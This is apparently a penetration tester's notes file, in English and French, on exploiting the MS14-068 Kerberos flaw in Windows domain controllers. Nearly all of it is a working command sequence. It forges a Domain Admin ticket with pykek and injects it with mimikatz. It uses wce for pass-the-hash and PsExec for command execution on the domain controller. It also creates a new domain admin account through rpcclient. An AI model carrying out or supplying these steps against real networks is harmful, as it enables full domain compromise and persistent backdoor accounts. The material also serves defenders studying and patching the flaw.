# ms14-068

apt-get install krb5-user rdate -y
rdate -n 10.10.10.10 # sync with DC's time

* I had to comment out below line in /etc/krb5.conf to not use a keyring but the default ccache file:
# default_ccache_name = KEYRING:persistent:%{uid} default_ccache_name = FILE:/tmp/krb5cc_%{uid}

* the domain FQDN has to be in uppercase otherwise you’ll get this error: “kinit: KDC reply did not match expectations while getting initial credentials”
$ kinit kevin@DOMAIN.INT 

* you should now have a /tmp/krb5cc_1000 file

* get the user’s SID
$ rpcclient -U ‘kevin%P@ssword1’ somedc.domain.int
rpcclient $> lookupnames kevin
kevin S-1-5-21-1234567890-12345678-9876543-77601 (User: 1) rpcclient $> exit

* use pykek to create a DA ticket
$ python ms14-068.py -u kevin@DOMAIN.INT -s S-1-5-21-1234567890-12345678-9876543-77601 -d thepdc.domain.int

* replace the ticket
$ mv TGT_kevin@DOMAIN.INT.ccache /tmp/krb5cc_1000

* pass -k and FQDN on command line (and not the IP, otherwise it will be ntlm)
might need to first: export KRB5CCNAME=/root/Admin@domain.int.ccache && chmod 700 $KRB5CCNAME
klist
smbclient --kerberos -W DOMAIN.INT //dcw2k12.domain.int/c$ # might not work on vulnerable w2k12r2 

kvno ldap/dcw2k12.domain.int@DOMAIN.INT # obtain service ticket
klist

* On my Windows7 VM I ran cmd.exe as Administrator and generated the hash of kevin’s password
C:\>wce.exe -g P@ssword1

* changed my current logon session
C:\>wce.exe -s kevin:DOMAIN:11CB3F697332AE4C38F10713B629B565:EAD0CC57DDAAE50D876B7DD6386FA9C7

* used mimikatz to inject DA ticket
C:\>mimikatz.exe
mimikatz # kerberos::ptc c:\TGT_kevin@DOMAIN.INT.ccache
mimikatz # exit

* confirmed I now was a DA
C:\>dir \\thepdf.domain.int\c$

* Now to get command exec, I simply killed explorer and spawned another explorer from the cmd.exe and ran psexec:
C:\>explorer
C:\>PsExec.exe \\thepdc.domain.int cmd.exe

# winexe -k
jamais teste mais ca a pas l'air de marcher avec winexe -k yes
il faudra essayer avec winexe-waf

# avec le patch de _r1
copie du TGT_<user>@<domain> dans /tmp/krb5cc_<uid>
modifier son resolv.conf pour ajouter "nameserver <ip_ad>"

rpcclient -k -I <ip_addr> <FQDN_DC> 
rpcclient $> createdomuser toto
rpcclient $> setuserinfo2 toto 21 <password>
rpcclient $> addgroupmember 512 toto
(512 : groupe admin de dom)
=> toto est admin de dom

# avec net -k
http://www.josho.org/blog/blog/2014/12/21/ldap-create-user/

# avec winexe -k
winexe: Installed: 1.1~20130620-0kali5
krb5-user: Installed: 1.10.1+dfsg-5+deb7u3

# blogs
https://labs.mwrinfosecurity.com/blog/2014/12/16/digging-into-ms14-068-exploitation-and-defence/
http://blogs.technet.com/b/srd/archive/2014/11/18/additional-information-about-cve-2014-6324.aspx
http://hashcrack.org/page?n=10122014
https://www.trustedsec.com/december-2014/ms14-068-full-compromise-step-step/
https://www.shellandco.net/ms14-068-check-domain-controllers-date/ # remote check in powershell using wmi
http://www.verisgroup.com/2015/04/08/ms14-068-background/ # convert krb tickets

